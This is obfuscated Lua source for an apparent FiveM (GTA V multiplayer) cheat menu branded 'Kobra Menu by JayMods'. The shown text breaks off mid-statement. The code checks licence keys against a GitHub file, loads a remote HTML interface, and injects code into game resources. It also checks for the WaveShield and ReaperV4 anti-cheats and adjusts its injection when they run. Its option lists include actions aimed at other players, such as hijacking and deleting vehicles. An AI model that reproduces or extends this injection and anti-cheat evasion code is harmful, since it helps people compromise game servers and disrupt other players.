MachoLockLogger(777 -(765 + 11) );local v0="jkiushdiufhsdbofihUYHFUYJASHIUYGAS872765873u4hj5nkjbytFCUSAKIHJJYDSFHTDHSHOIUHdiuaghdfjyhsbdioufjneqwouerhy287y34gujkdsnikufguyhcflbijksdfhugygdisufhgsyhtgdfvsd";local function v1(v119,v120) local v121=0 + 0 ;local v122;while true do if (v121==0) then v122="";for v670=524 -(423 + 100) , #v119 do local v671=string.byte(v119,v670);v122=v122   .. string.char((v671-v120)%(2 + 254) ) ;end v121=1;end if (v121==1) then if DEBUG then local v755=0 -0 ;local v756;while true do if (v755==(1 + 0)) then print("[KOBRA Safety] Decoded secret: "   .. table.concat(v756,",") );break;end if (v755==(771 -(326 + 445))) then v756={};for v1042=4 -3 , #v122 do v756[v1042]=string.byte(v122,v1042);end v755=2 -1 ;end end end return v122;end end end local v2="https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json";local v3=MachoWebRequest(v2);local v4=MachoAuthenticationKey();local v5=true;local function v6() local v123=0 -0 ;local v124;while true do if (v123==(711 -(530 + 181))) then v124=GetCloudTimeAsInt();return ((v124>(881 -(614 + 267))) and v124) or (32 -(19 + 13)) ;end end end local function v7(v125) local v126=0 -0 ;local v127;local v128;local v129;local v130;local v131;local v132;local v133;while true do if (v126==(0 -0)) then if (type(v125)~="string") then return nil;end v127,v128,v129,v130,v131,v132=string.match(v125,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");v126=2 -1 ;end if (v126==(1 + 1)) then return (v133 * (151949 -65549)) + (tonumber(v130) * (7465 -3865)) + (tonumber(v131) * (1872 -(1293 + 519))) + tonumber(v132) ;end if (v126==1) then if  not v127 then return nil;end v133=((tonumber(v127) -1970) * (744 -379)) + math.floor((tonumber(v127) -1969)/(9 -5) ) + ((tonumber(v128) -(1 -0)) * (129 -99)) + tonumber(v129) ;v126=2;end end end local function v8() local v134=0 -0 ;local v135;local v136;local v137;while true do if (v134==1) then if ( not v135 or  not v136 or (type(v136)~="table")) then return false,"Key list invalid";end v137=v6();v134=2;end if ((0 + 0)==v134) then if  not v3 then return false,"No key list available";end v135,v136=pcall(json.decode,v3);v134=1;end if (v134==2) then for v672,v673 in ipairs(v136) do if ((type(v673)=="table") and (v673.key==v4)) then if (v673.expires and (type(v673.expires)=="string")) then local v959=v7(v673.expires);if  not v959 then return false,"Bad expiry format";end if (v959>v137) then return true,"Key valid (not expired)",v959;else return false,"Key expired",v959;end elseif v5 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end end end local v9,v10,v11=v8();if  not v9 then local v315=0;while true do if (v315==(0 + 0)) then MachoMenuNotification("KOBRA","Your key ain't valid lmfao: "   .. v4   .. " ("   .. v10   .. ")" ,10);return;end end end Citizen.CreateThread(function() if (v11 and (v11>(0 -0))) then local v498=v6();local v499=v11-v498 ;if (v499>(0 + 0)) then local v674=math.floor(v499/86400 );local v675=math.floor((v499%(28703 + 57697))/3600 );local v676=string.format("Your key is valid. Expires in %d days and %d hours.",v674,v675);MachoMenuNotification("KOBRA",v676,4 + 1 );else MachoMenuNotification("KOBRA","Key expired.",10);end else MachoMenuNotification("KOBRA","Key valid (no expiry field).",1101 -(709 + 387) );end end);local v12={};local v13=false;local v14=nil;local v15=1;local v16={};local v17=v16;local v18=nil;local v19=1;local v20={};local v21={};local v22=nil;local v23="H";local v24=false;local v25={};local v26=false;local v27={};local v28={[GetHashKey("weapon_unarmed")]="Fists",[GetHashKey("weapon_knife")]="Knife",[GetHashKey("weapon_nightstick")]="Nightstick",[GetHashKey("weapon_hammer")]="Hammer",[GetHashKey("weapon_bat")]="Baseball Bat",[GetHashKey("weapon_golfclub")]="Golf Club",[GetHashKey("weapon_crowbar")]="Crowbar",[GetHashKey("weapon_pistol")]="Pistol",[GetHashKey("weapon_pistol_mk2")]="Pistol Mk II",[GetHashKey("weapon_snspistol_mk2")]="SNS Pistol Mk II",[GetHashKey("weapon_ceramicpistol")]="Ceramic Pistol",[GetHashKey("weapon_revolver_mk2")]="Heavy Revolver Mk II",[GetHashKey("weapon_doubleaction")]="Double-Action Revolver",[GetHashKey("weapon_gadgetpistol")]="Gadget Pistol",[GetHashKey("weapon_pistolxm3")]="WM 29 Pistol",[GetHashKey("weapon_combatpistol")]="Combat Pistol",[GetHashKey("weapon_appistol")]="AP Pistol",[GetHashKey("weapon_pistol50")]="Pistol .50",[GetHashKey("weapon_microsmg")]="Micro SMG",[GetHashKey("weapon_smg")]="SMG",[GetHashKey("weapon_assaultsmg")]="Assault SMG",[GetHashKey("weapon_assaultrifle")]="Assault Rifle",[GetHashKey("weapon_assaultrifle_mk2")]="Assault Rifle Mk II",[GetHashKey("weapon_specialcarbine_mk2")]="Special Carbine Mk II",[GetHashKey("weapon_bullpuprifle_mk2")]="Bullpup Rifle Mk II",[GetHashKey("weapon_militaryrifle")]="Military Rifle",[GetHashKey("weapon_tacticalrifle")]="Service Carbine",[GetHashKey("weapon_battlerifle")]="Battle Rifle",[GetHashKey("weapon_carbinerifle")]="Carbine Rifle",[GetHashKey("weapon_advancedrifle")]="Advanced Rifle",[GetHashKey("weapon_mg")]="MG",[GetHashKey("weapon_combatmg")]="Combat MG",[GetHashKey("weapon_pumpshotgun")]="Pump Shotgun",[GetHashKey("weapon_sawnoffshotgun")]="Sawed-Off Shotgun",[GetHashKey("weapon_assaultshotgun")]="Assault Shotgun",[GetHashKey("weapon_bullpupshotgun")]="Bullpup Shotgun",[GetHashKey("weapon_hackingdevice")]="Hacking Device",[GetHashKey("weapon_stungun")]="Stun Gun",[GetHashKey("weapon_stungun_mp")]="Stun Gun MP",[GetHashKey("weapon_sniperrifle")]="Sniper Rifle",[GetHashKey("weapon_heavysniper")]="Heavy Sniper",[GetHashKey("weapon_grenadelauncher")]="Grenade Launcher",[GetHashKey("weapon_rpg")]="RPG",[GetHashKey("weapon_minigun")]="Minigun",[GetHashKey("weapon_grenade")]="Grenade",[GetHashKey("weapon_stickybomb")]="Sticky Bomb",[GetHashKey("weapon_smokegrenade")]="Smoke Grenade",[GetHashKey("weapon_bzgas")]="BZ Gas",[GetHashKey("weapon_molotov")]="Molotov Cocktail",[GetHashKey("weapon_fireextinguisher")]="Fire Extinguisher",[GetHashKey("weapon_petrolcan")]="Jerry Can",[GetHashKey("weapon_ball")]="Baseball",[GetHashKey("weapon_snspistol")]="SNS Pistol",[GetHashKey("weapon_bottle")]="Broken Bottle",[GetHashKey("weapon_gusenberg")]="Gusenberg Sweeper",[GetHashKey("weapon_specialcarbine")]="Special Carbine",[GetHashKey("weapon_heavypistol")]="Heavy Pistol",[GetHashKey("weapon_bullpuprifle")]="Bullpup Rifle",[GetHashKey("weapon_dagger")]="Dagger",[GetHashKey("weapon_vintagepistol")]="Vintage Pistol",[GetHashKey("weapon_firework")]="Firework Launcher",[GetHashKey("weapon_musket")]="Musket",[GetHashKey("weapon_heavyshotgun")]="Heavy Shotgun",[GetHashKey("weapon_marksmanrifle")]="Marksman Rifle",[GetHashKey("weapon_hominglauncher")]="Homing Launcher",[GetHashKey("weapon_proxmine")]="Proximity Mines",[GetHashKey("weapon_snowball")]="Snowball",[GetHashKey("weapon_flaregun")]="Flare Gun",[GetHashKey("weapon_garbagebag")]="Garbage Bag",[GetHashKey("weapon_handcuffs")]="Handcuffs",[GetHashKey("weapon_combatpdw")]="Combat PDW",[GetHashKey("weapon_marksmanpistol")]="Marksman Pistol",[GetHashKey("weapon_knuckle")]="Knuckle Dusters",[GetHashKey("weapon_hatchet")]="Hatchet",[GetHashKey("weapon_railgun")]="Railgun",[GetHashKey("weapon_machinepistol")]="Machine Pistol",[GetHashKey("weapon_switchblade")]="Switchblade",[GetHashKey("weapon_revolver")]="Heavy Revolver",[GetHashKey("weapon_heavyrifle")]="Heavy Rifle",[GetHashKey("weapon_dbshotgun")]="Double Barrel Shotgun",[GetHashKey("weapon_compactrifle")]="Compact Rifle",[GetHashKey("weapon_battleaxe")]="Battle Axe",[GetHashKey("weapon_compactlauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_minismg")]="Mini SMG",[GetHashKey("weapon_pipebomb")]="Pipe Bomb",[GetHashKey("weapon_poolcue")]="Pool Cue",[GetHashKey("weapon_wrench")]="Wrench",[GetHashKey("weapon_autoshotgun")]="Sweeper Shotgun",[GetHashKey("weapon_bread")]="Piece of Bread",[GetHashKey("weapon_stone_hatchet")]="Stone Hatchet",[GetHashKey("weapon_rayminigun")]="Unholy Hellbringer",[GetHashKey("weapon_raycarbine")]="Widowmaker",[GetHashKey("weapon_compactgrenadelauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_smugglerpistol")]="Up-n-Atomizer",[GetHashKey("weapon_raypistol")]="Up-n-Atomizer",[GetHashKey("weapon_perico_pistol")]="Ceramic Pistol",[GetHashKey("weapon_carbinerifle_mk2")]="Carbine Rifle Mk II",[GetHashKey("weapon_combatmg_mk2")]="Combat MG Mk II",[GetHashKey("weapon_heavysniper_mk2")]="Heavy Sniper Mk II",[GetHashKey("weapon_marksmanrifle_mk2")]="Marksman Rifle Mk II",[GetHashKey("weapon_pumpshotgun_mk2")]="Pump Shotgun Mk II",[GetHashKey("weapon_smg_mk2")]="SMG Mk II",[GetHashKey("weapon_raycarbine_mk2")]="Widowmaker Mk II",[GetHashKey("weapon_machete")]="Machete",[GetHashKey("weapon_flashlight")]="Flashlight",[GetHashKey("weapon_hazardousknife")]="Hazardous Knife",[GetHashKey("weapon_navyrevolver")]="Navy Revolver",[GetHashKey("weapon_golfball")]="Golf Ball"};local v29=false;local v30=false;local v31=false;local v32=false;local v33=nil;local v34=1859 -(673 + 1185) ;local v35=2 -1 ;local v36={"WEAPON_APPISTOL","WEAPON_PISTOL","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_RPG","WEAPON_PERMKILL","WEAPON_AIRSTRIKE_ROCKET"};local v37={"Adder","Zentorno","Comet","Banshee","Trash","Dump"};local v38={"Default","Teleport","Shoot Weapon","Kick from Vehicle","Hijack Vehicle","Delete Vehicle"};local v39=1848 -(559 + 1288) ;local v40=false;local v41=false;local v42=false;local v43=false;local v44={[1958 -(609 + 1322) ]="Escape",[112]="F1",[113]="F2",[568 -(13 + 441) ]="F3",[429 -314 ]="F4",[303 -187 ]="F5",[582 -465 ]="F6",[118]="F7",[119]="F8",[5 + 115 ]="F9",[439 -318 ]="F10",[122]="F11",[123]="F12",[69 + 123 ]="`",[22 + 27 ]="1",[148 -98 ]="2",[51]="3",[29 + 23 ]="4",[96 -43 ]="5",[54]="6",[37 + 18 ]="7",[32 + 24 ]="8",[41 + 16 ]="9",[41 + 7 ]="0",[185 + 4 ]="-",[187]="=",[8]="Backspace",[442 -(153 + 280) ]="Tab",[233 -152 ]="Q",[79 + 8 ]="W",[69]="E",[33 + 49 ]="R",[44 + 40 ]="T",[89]="Y",[85]="U",[67 + 6 ]="I",[58 + 21 ]="O",[121 -41 ]="P",[136 + 83 ]="[",[888 -(89 + 578) ]="]",[220]="\\",[20]="CapsLock",[47 + 18 ]="A",[171 -88 ]="S",[1117 -(572 + 477) ]="D",[10 + 60 ]="F",[71]="G",[44 + 28 ]="H",[74]="J",[9 + 66 ]="K",[76]="L",[186]=";",[308 -(84 + 2) ]="'",[21 -8 ]="Enter",[12 + 4 ]="Shift",[90]="Z",[930 -(497 + 345) ]="X",[2 + 65 ]="C",[86]="V",[66]="B",[14 + 64 ]="N",[1410 -(605 + 728) ]="M",[135 + 53 ]=",",[190]=".",[191]="/",[37 -20 ]="Control",[3 + 43 ]="Delete",[121 -88 ]="PageUp",[31 + 3 ]="PageDown",[96 -61 ]="End",[28 + 8 ]="Home",[527 -(457 + 32) ]="ArrowUp",[40]="ArrowDown",[37]="ArrowLeft",[39]="ArrowRight"};local v45={[27]=137 + 185 ,[1514 -(832 + 570) ]=272 + 16 ,[30 + 83 ]=289,[403 -289 ]=170,[115]=81 + 86 ,[912 -(588 + 208) ]=166,[315 -198 ]=167,[1918 -(884 + 916) ]=168,[248 -129 ]=98 + 71 ,[120]=709 -(232 + 421) ,[2010 -(1569 + 320) ]=57,[30 + 92 ]=66 + 278 ,[414 -291 ]=950 -(316 + 289) ,[502 -310 ]=12 + 231 ,[49]=1610 -(666 + 787) ,[475 -(360 + 65) ]=148 + 10 ,[305 -(79 + 175) ]=160,[81 -29 ]=128 + 36 ,[161 -108 ]=317 -152 ,[54]=1058 -(503 + 396) ,[236 -(92 + 89) ]=312 -151 ,[56]=84 + 78 ,[57]=97 + 66 ,[187 -139 ]=12 + 70 ,[430 -241 ]=84,[187]=83,[7 + 1 ]=177,[5 + 4 ]=112 -75 ,[81]=6 + 38 ,[131 -44 ]=1276 -(485 + 759) ,[69]=106 -60 ,[1271 -(442 + 747) ]=1180 -(832 + 303) ,[1030 -(88 + 858) ]=75 + 170 ,[74 + 15 ]=246,[4 + 81 ]=303,[73]=74,[79]=199,[869 -(766 + 23) ]=34 -27 ,[298 -79 ]=102 -63 ,[749 -528 ]=1113 -(1036 + 37) ,[220]=26 + 10 ,[38 -18 ]=137,[65]=34,[66 + 17 ]=33,[68]=1510 -(641 + 839) ,[983 -(910 + 3) ]=49,[180 -109 ]=47,[1756 -(1466 + 218) ]=35 + 39 ,[1222 -(556 + 592) ]=311,[27 + 48 ]=1119 -(329 + 479) ,[930 -(174 + 680) ]=23 -16 ,[384 -198 ]=58 + 23 ,[961 -(396 + 343) ]=8 + 74 ,[1490 -(29 + 1448) ]=18,[1405 -(135 + 1254) ]=78 -57 ,[420 -330 ]=14 + 6 ,[1615 -(389 + 1138) ]=647 -(102 + 472) ,[64 + 3 ]=15 + 11 ,[81 + 5 ]=1545 -(320 + 1225) ,[66]=51 -22 ,[48 + 30 ]=1713 -(157 + 1307) ,[1936 -(821 + 1038) ]=608 -364 ,[21 + 167 ]=145 -63 ,[71 + 119 ]=200 -119 ,[1217 -(834 + 192) ]=6 + 77 ,[17]=10 + 26 ,[1 + 45 ]=275 -97 ,[33]=314 -(300 + 4) ,[10 + 24 ]=28 -17 ,[35]=575 -(112 + 250) ,[15 + 21 ]=213,[38]=67 -40 ,[23 + 17 ]=173,[20 + 17 ]=131 + 43 ,[20 + 19 ]=131 + 44 };local v46={weapon_unarmed={label="Unarmed",hash=GetHashKey("weapon_unarmed")},weapon_knife={label="Knife",hash=GetHashKey("weapon_knife")},weapon_dagger={label="Dagger",hash=GetHashKey("weapon_dagger")},weapon_bat={label="Baseball Bat",hash=GetHashKey("weapon_bat")},weapon_bottle={label="Broken Bottle",hash=GetHashKey("weapon_bottle")},weapon_crowbar={label="Crowbar",hash=GetHashKey("weapon_crowbar")},weapon_golfclub={label="Golf Club",hash=GetHashKey("weapon_golfclub")},weapon_hammer={label="Hammer",hash=GetHashKey("weapon_hammer")},weapon_hatchet={label="Hatchet",hash=GetHashKey("weapon_hatchet")},weapon_machete={label="Machete",hash=GetHashKey("weapon_machete")},weapon_switchblade={label="Switchblade",hash=GetHashKey("weapon_switchblade")},weapon_nightstick={label="Nightstick",hash=GetHashKey("weapon_nightstick")},weapon_wrench={label="Wrench",hash=GetHashKey("weapon_wrench")},weapon_pistol={label="Pistol",hash=GetHashKey("weapon_pistol")},weapon_pistol_mk2={label="Pistol Mk II",hash=GetHashKey("weapon_pistol_mk2")},weapon_combatpistol={label="Combat Pistol",hash=GetHashKey("weapon_combatpistol")},weapon_appistol={label="AP Pistol",hash=GetHashKey("weapon_appistol")},weapon_stungun={label="Taser",hash=GetHashKey("weapon_stungun")},weapon_pistol50={label="Pistol .50",hash=GetHashKey("weapon_pistol50")},weapon_snspistol={label="SNS Pistol",hash=GetHashKey("weapon_snspistol")},weapon_heavypistol={label="Heavy Pistol",hash=GetHashKey("weapon_heavypistol")},weapon_vintagepistol={label="Vintage Pistol",hash=GetHashKey("weapon_vintagepistol")},weapon_flaregun={label="Flare Gun",hash=GetHashKey("weapon_flaregun")},weapon_microsmg={label="Micro SMG",hash=GetHashKey("weapon_microsmg")},weapon_smg={label="SMG",hash=GetHashKey("weapon_smg")},weapon_smg_mk2={label="SMG Mk II",hash=GetHashKey("weapon_smg_mk2")},weapon_assaultsmg={label="Assault SMG",hash=GetHashKey("weapon_assaultsmg")},weapon_machinepistol={label="Machine Pistol",hash=GetHashKey("weapon_machinepistol")},weapon_minismg={label="Mini SMG",hash=GetHashKey("weapon_minismg")},weapon_combatpdw={label="Combat PDW",hash=GetHashKey("weapon_combatpdw")},weapon_assaultrifle={label="Assault Rifle",hash=GetHashKey("weapon_assaultrifle")},weapon_assaultrifle_mk2={label="Assault Rifle Mk II",hash=GetHashKey("weapon_assaultrifle_mk2")},weapon_carbinerifle={label="Carbine Rifle",hash=GetHashKey("weapon_carbinerifle")},weapon_carbinerifle_mk2={label="Carbine Rifle Mk II",hash=GetHashKey("weapon_carbinerifle_mk2")},weapon_advancedrifle={label="Advanced Rifle",hash=GetHashKey("weapon_advancedrifle")},weapon_specialcarbine={label="Special Carbine",hash=GetHashKey("weapon_specialcarbine")},weapon_bullpuprifle={label="Bullpup Rifle",hash=GetHashKey("weapon_bullpuprifle")},weapon_bullpuprifle_mk2={label="Bullpup Rifle Mk II",hash=GetHashKey("weapon_bullpuprifle_mk2")},weapon_compactrifle={label="Compact Rifle",hash=GetHashKey("weapon_compactrifle")},weapon_marksmanrifle={label="Marksman Rifle",hash=GetHashKey("weapon_marksmanrifle")},weapon_pumpshotgun={label="Pump Shotgun",hash=GetHashKey("weapon_pumpshotgun")},weapon_pumpshotgun_mk2={label="Pump Shotgun Mk II",hash=GetHashKey("weapon_pumpshotgun_mk2")},weapon_sawnoffshotgun={label="Sawed-Off Shotgun",hash=GetHashKey("weapon_sawnoffshotgun")},weapon_assaultshotgun={label="Assault Shotgun",hash=GetHashKey("weapon_assaultshotgun")},weapon_bullpupshotgun={label="Bullpup Shotgun",hash=GetHashKey("weapon_bullpupshotgun")},weapon_heavyshotgun={label="Heavy Shotgun",hash=GetHashKey("weapon_heavyshotgun")},weapon_autoshotgun={label="Auto Shotgun",hash=GetHashKey("weapon_autoshotgun")},weapon_sniperrifle={label="Sniper Rifle",hash=GetHashKey("weapon_sniperrifle")},weapon_heavysniper={label="Heavy Sniper",hash=GetHashKey("weapon_heavysniper")},weapon_heavysniper_mk2={label="Heavy Sniper Mk II",hash=GetHashKey("weapon_heavysniper_mk2")},weapon_marksmanrifle_mk2={label="Marksman Rifle Mk II",hash=GetHashKey("weapon_marksmanrifle_mk2")},weapon_grenade={label="Grenade",hash=GetHashKey("weapon_grenade")},weapon_stickybomb={label="Sticky Bomb",hash=GetHashKey("weapon_stickybomb")},weapon_molotov={label="Molotov Cocktail",hash=GetHashKey("weapon_molotov")},weapon_pipebomb={label="Pipe Bomb",hash=GetHashKey("weapon_pipebomb")},weapon_proxmine={label="Proximity Mine",hash=GetHashKey("weapon_proxmine")},weapon_rpg={label="RPG",hash=GetHashKey("weapon_rpg")},weapon_grenadelauncher={label="Grenade Launcher",hash=GetHashKey("weapon_grenadelauncher")},weapon_hominglauncher={label="Homing Launcher",hash=GetHashKey("weapon_hominglauncher")},weapon_minigun={label="Minigun",hash=GetHashKey("weapon_minigun")},weapon_railgun={label="Railgun",hash=GetHashKey("weapon_railgun")},weapon_ball={label="Baseball",hash=GetHashKey("weapon_ball")},weapon_smokegrenade={label="Smoke Grenade",hash=GetHashKey("weapon_smokegrenade")},weapon_flare={label="Flare",hash=GetHashKey("weapon_flare")},weapon_petrolcan={label="Jerry Can",hash=GetHashKey("weapon_petrolcan")},weapon_bzgas={label="BZ Gas",hash=GetHashKey("weapon_bzgas")}};local v47=((GetResourceState("WaveShield")=="started") and "Raw") or "Default" ;local v48=((v47=="Raw") and MachoInjectResourceRaw) or MachoInjectResource ;local function v49(v138) MachoInjectResource("any",v138);end v12.Debug=function(v139,v140,v141) local v142=1414 -(1001 + 413) ;local v143;local v144;while true do if (v142==(2 -1)) then print(("^7[^5Kobra^7]: [%sDEBUG^7] >> %s"):format(v144,v141));break;end if (v142==(882 -(244 + 638))) then v143={red="^1",yellow="^3",green="^2",info="^5"};v144=v143[v140] or "^5" ;v142=694 -(627 + 66) ;end end end;v12.SendMessage=function(v145,v146) if (v14 and v146) then MachoSendDuiMessage(v14,json.encode(v146));end end;v12.Notify=function(v147,v148,v149,v150,v151) v147:SendMessage({action="showNotification",type=v148,title=v149,desc=v150,duration=v151});end;v12.GetMenuPath=function(v152) local v153={"Kobra Menu by JayMods"};for v316=1, #v21 do table.insert(v153,v21[v316]);end return v153;end;v12.UpdateElements=function(v154,v155) if ( not v155 or (type(v155)~="table")) then return;end local v156={action="updateElements",elements=v155,index=v15-1 ,path=v154:GetMenuPath()};if (v18 and (type(v18)=="table") and ( #v18>0)) then local v500=0 -0 ;while true do if (v500==0) then v156.categories=v18;v156.categoryIndex=(v19 or (603 -(512 + 90))) -(1907 -(1665 + 241)) ;break;end end end v154:SendMessage(v156);end;v12.Initialize=function(v157) local v158=0;local v159;while true do if (v158==(717 -(373 + 344))) then v159="https://rawcdn.githack.com/WM5M/sdkhbvfsdhjkvbdbcfjgasvdhjve64654656843242hjg4g43kg4aguk534/refs/heads/main/hhh.html";v14=MachoCreateDui(v159);v158=1 + 0 ;end if (v158==(1 + 0)) then if v14 then local v759=0 -0 ;while true do if (v759==0) then v157:Debug("yellow","Creating & Initializing Kobra DUI...");MachoShowDui(v14);v759=1 -0 ;end if (v759==1) then v157:Debug("green","Kobra UI loaded successfully!");break;end end else v157:Debug("red","Failed to load Kobra UI!");end break;end end end;v12.HideUI=function(v160,v161) if v161 then v22={currentMenu=v17,hoveredIndex=v15,menuStack=v20,menuLabelStack=v21,currentCategories=v18,currentCategoryIndex=v19};else v22=nil;end v13=false;v160:SendMessage({action="keydown",index=1099 -(35 + 1064) });v160:SendMessage({action="showUI",visible=false,index=0});end;v12.SendMessage=function(v162,v163) local v164=0;while true do if (v164==(0 + 0)) then if ( not v14 or  not v163 or (type(v163)~="table")) then return;end MachoSendDuiMessage(v14,json.encode(v163));break;end end end;v12.ShowUI=function(v165) v13=true;local v166={action="showUI",visible=true,elements=v17,index=v15-(2 -1) ,path=v165:GetMenuPath(),username=Username or "KobraBypass" ,header="JayMods",theme="kobra-red-black"};if (v18 and ( #v18>(0 + 0))) then v166.categories=v18;v166.categoryIndex=v19-1 ;end v165:SendMessage(v166);end;v12.UpdateElements=function(v167,v168) if ( not v168 or (type(v168)~="table")) then return;end local v169={action="updateElements",elements=v168,index=v15-(1237 -(298 + 938)) ,path=v167:GetMenuPath(),header="JayMods"};if (v18 and ( #v18>0)) then local v503=1259 -(233 + 1026) ;while true do if (v503==0) then v169.categories=v18;v169.categoryIndex=(v19 or (1667 -(636 + 1030))) -(1 + 0) ;break;end end end v167:SendMessage(v169);end;v12.IsShiftHeld=function(v170) return v26;end;MachoOnKeyDown(function(v171) if ((v171==(16 + 0)) or (v171==(48 + 112)) or (v171==(11 + 150))) then v26=true;end end);MachoOnKeyUp(function(v172) if ((v172==16) or (v172==160) or (v172==(382 -(55 + 166)))) then v26=false;end end);local v59=nil;local function v60(v173,v174,v175,v176) local v177=0 + 0 ;while true do if (v177==3) then v24=false;break;end if (v177==0) then if v59 then return;end v59={title=v173,buffer=v174 or "" ,maxLength=32,onConfirm=v175,type=v176 or "typeable" ,closeable=((v176=="keybind") and false) or true ,active=true};v177=1;end if (v177==(1 + 1)) then Wait(954 -704 );v12:HideUI(true);v177=300 -(36 + 261) ;end if (v177==(1 -0)) then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v173,value=v59.buffer}));if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);end v177=1370 -(34 + 1334) ;end end end MachoOnKeyDown(function(v178) if ( not v59 or  not v59.active) then return;end if (v178==(5 + 8)) then v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));if v59.onConfirm then v59.onConfirm(v59.buffer);end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);end v59=nil;v24=true;return;elseif (v178==8) then if (v59.type=="typeable") then v59.buffer=v59.buffer:sub(1 + 0 , -(1285 -(1035 + 248)));else v59.buffer="";end elseif (v178==27) then local v826=21 -(20 + 1) ;while true do if (v826==(2 + 0)) then v59=nil;v24=true;v826=3;end if (v826==(319 -(134 + 185))) then if  not v59.closeable then return;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);end v826=1134 -(549 + 584) ;end if (v826==(688 -(314 + 371))) then return;end if (v826==(3 -2)) then v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v826=970 -(478 + 490) ;end end elseif (v59.type=="keybind") then local v960=v44[v178];if v960 then if (v59.buffer~=v960) then v59.buffer=v960;end end elseif (v59.type=="typeable") then local v1117={[26 + 22 ]="0",[1221 -(786 + 386) ]="1",[161 -111 ]="2",[1430 -(1055 + 324) ]="3",[52]="4",[53]="5",[54]="6",[1395 -(1093 + 247) ]="7",[50 + 6 ]="8",[57]="9",[65]="A",[7 + 59 ]="B",[265 -198 ]="C",[230 -162 ]="D",[69]="E",[199 -129 ]="F",[178 -107 ]="G",[26 + 46 ]="H",[280 -207 ]="I",[255 -181 ]="J",[75]="K",[76]="L",[77]="M",[59 + 19 ]="N",[201 -122 ]="O",[768 -(364 + 324) ]="P",[81]="Q",[224 -142 ]="R",[198 -115 ]="S",[84]="T",[85]="U",[29 + 57 ]="V",[364 -277 ]="W",[140 -52 ]="X",[270 -181 ]="Y",[1358 -(1249 + 19) ]="Z",[189]="-",[169 + 18 ]="=",[731 -543 ]=",",[1276 -(686 + 400) ]=".",[146 + 40 ]=";",[451 -(73 + 156) ]="'",[1 + 190 ]="/",[1003 -(721 + 90) ]="`",[1 + 31 ]=" "};local v1118=v1117[v178];if (v1118 and ( #v59.buffer<v59.maxLength)) then if v12:IsShiftHeld() then if v1118:match("%a") then v1118=v1118:upper();elseif (v1118=="-") then v1118="_";end elseif v1118:match("%a") then v1118=v1118:lower();end v59.buffer=v59.buffer   .. v1118 ;end end if v59 then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v59.title,value=v59.buffer}));end end);CreateThread(function() while true do Wait(0 -0 );if (v59~=nil) then local v584=0;while true do if (v584==(470 -(224 + 246))) then if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);end SetPauseMenuActive(false);v584=1 -0 ;end if (v584==(1 -0)) then for v861=0 + 0 ,9 + 348  do if ((v861<48) or (v861>(67 + 23))) then DisableControlAction(0 -0 ,v861,true);end end break;end end else Wait(500);end end end);v12.ScrollOne=function(v179,v180) local v181=0 -0 ;local v182;while true do if ((514 -(203 + 310))==v181) then repeat if (v180=="Up") then v15=v15-(1994 -(1238 + 755)) ;if (v15<(1 + 0)) then v15= #v17;end elseif (v180=="Down") then local v961=1534 -(709 + 825) ;while true do if (v961==0) then v15=v15 + (1 -0) ;if (v15> #v17) then v15=1;end break;end end end v182=v182 + (1 -0) ;if (v182>(1064 -(196 + 668))) then break;end until v17[v15] and (v17[v15].type~="divider")  if v14 then v179:SendMessage({action="keydown",index=v15-(3 -2) });end break;end if (v181==0) then if ( not v180 or ( #v17==(0 -0))) then return;end v182=833 -(171 + 662) ;v181=94 -(4 + 89) ;end end end;v12.ScrollTwo=function(v183,v184) local v185=0;local v186;while true do if ((0 -0)==v185) then v186=v17[v15];if  not v186 then return;end v185=1 + 0 ;end if (v185==(4 -3)) then if (((v186.type=="scrollable") or (v186.type=="scrollable-checkbox")) and v186.values and ( #v186.values>0)) then v186.value=v186.value or 1 ;if (v184=="Left") then local v862=0 + 0 ;while true do if (v862==(1486 -(35 + 1451))) then v186.value=v186.value-(1454 -(28 + 1425)) ;if (v186.value<1) then v186.value= #v186.values;end break;end end elseif (v184=="Right") then local v1045=1993 -(941 + 1052) ;while true do if (v1045==(0 + 0)) then v186.value=v186.value + 1 ;if (v186.value> #v186.values) then v186.value=1;end break;end end end v183:UpdateElements(v17);if ((v186.scrollType=="onScroll") and v186.onSelect) then if (v186.type=="scrollable-checkbox") then v186.onSelect(v186.values[v186.value],v186.checked or false );else v186.onSelect(v186.values[v186.value]);end end elseif ((v186.type=="slider") or (v186.type=="slider-checkbox")) then local v863=1514 -(822 + 692) ;local v864;while true do if (v863==0) then v186.value=v186.value or v186.min or (0 -0) ;v864=v186.step or (1 + 0) ;v863=298 -(45 + 252) ;end if (v863==1) then if (v184=="Left") then v186.value=math.max(v186.min or 0 ,v186.value-v864 );elseif (v184=="Right") then v186.value=math.min(v186.max or (99 + 1) ,v186.value + v864 );end for v1189,v1190 in pairs(v25) do if 